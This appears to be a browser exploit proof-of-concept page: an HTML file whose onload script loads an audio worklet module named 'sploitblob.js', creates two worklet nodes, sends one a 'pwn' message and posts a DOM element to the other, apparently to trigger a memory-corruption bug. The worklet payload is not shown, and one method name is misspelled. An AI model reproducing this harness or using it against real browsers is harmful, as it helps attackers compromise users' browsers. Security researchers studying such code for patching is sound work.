<html>
  <head>
    <script>
      function log(s) {
        document.body.innerText += s + "\n";
      }
      var d = document.createElement('div');
      var keep = [];
      async function start() {
        log("starting...")
        var context = new OfflineAudioContext(1, 128, 300000);
        context.audioWorklet.addModule("sploitblob.js").then(async () => {
          var wa = new AudioWorkletNode(context, "a");
          var wb = new AudioWorkletNode(context, "b");
          wa.port.onmessage = (e) => { log(e.data); console.log(e.data) }
          await (new Promise((res) => setTimeout(res, 100)));
          wa.port.postMessage("pwn");
          wb.port.postMesssage(d);
        });
      }
    </script>
  </head>
  <body onload="start()">
  </body>
</html>

